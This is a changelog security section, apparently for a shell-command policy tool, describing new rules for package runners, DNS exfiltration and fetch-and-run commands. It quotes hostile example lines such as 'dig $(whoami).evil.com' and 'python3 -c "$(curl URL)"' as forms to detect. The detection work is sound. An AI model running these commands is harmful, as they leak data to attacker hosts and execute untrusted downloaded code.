### Security
- `npx`, `bunx`, `pnpx`, `npm exec`, `npm x`, `pnpm dlx`, `yarn dlx`, `bun x`, `uvx`, `uv tool run` and `pipx run` are read for the package they fetch and run: a name that is a near miss of a popular package needs review as its install does (`package-near-miss`), and any other name not on the bundled popular list needs review too, pinned to a version or not (`package-run-unknown`, new in the default policy). A popular name still defers; `npx --no-install`, `npm exec --no` and `uvx --offline` fetch nothing and are unchanged. `openmoat allow --always` approves the package with the command (ADR-100).
- A host name a resolver or client gets that the shell builds at run time (`dig $(whoami).evil.com`, `nslookup ${X}.evil.com`, `host -t txt $C.evil.com`) is decided as the domain it ends in, which the default policy denies when unlisted, and `drill`, `kdig`, `delv`, `getent` and `resolvectl` name hosts as `dig` does: DNS exfiltration through a built name no longer defers. Conformance fixtures cover these forms, with neighbours that stay as they were (ADR-100).
- Downloaded code run through a command substitution in the program's place (`$(curl URL)`, also inside a shell's single-quoted string such as `sh -c '$(curl URL)'`), in an interpreter's inline code (`python3 -c "$(curl URL)"`), or in the command `find -exec` or `xargs` runs is denied as `curl URL | sh` is (`pipe-to-shell`); before, these deferred (ADR-100).
